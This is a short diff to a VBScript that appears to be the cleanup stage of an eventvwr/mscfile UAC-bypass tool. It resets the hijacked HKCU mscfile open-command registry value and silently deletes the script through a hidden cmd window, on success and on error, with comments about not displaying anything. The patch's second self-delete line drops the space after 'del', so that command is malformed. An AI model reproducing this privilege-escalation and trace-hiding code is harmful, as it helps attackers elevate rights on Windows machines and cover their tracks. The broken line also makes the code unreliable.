@@ -10,7 +10,8 @@ Sub Main()
 	'Reset regkey 
 	GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & "." & "\root\default:StdRegProv").DeleteValue &H80000001,"Software\Classes\mscfile\shell\open\command\",""
 	'Remove this script
-	CreateObject("WScript.Shell").Run "cmd /c del %temp%\"  + WScript.ScriptName, 0, False
+
+	CreateObject("WScript.Shell").Run "cmd /c del " + WScript.ScriptFullName, 0, False
 End Sub 
 'Dont wanna display shit
 On Error Resume Next
@@ -22,7 +23,7 @@ On Error Resume Next
 
      'on error cleanup and exit
 
-	CreateObject("WScript.Shell").Run "cmd /c del %temp%\"  + WScript.ScriptName, 0, False
+	CreateObject("WScript.Shell").Run "cmd /c del" + WScript.ScriptFullName, 0, False
 
      WScript.Quit 4711
 
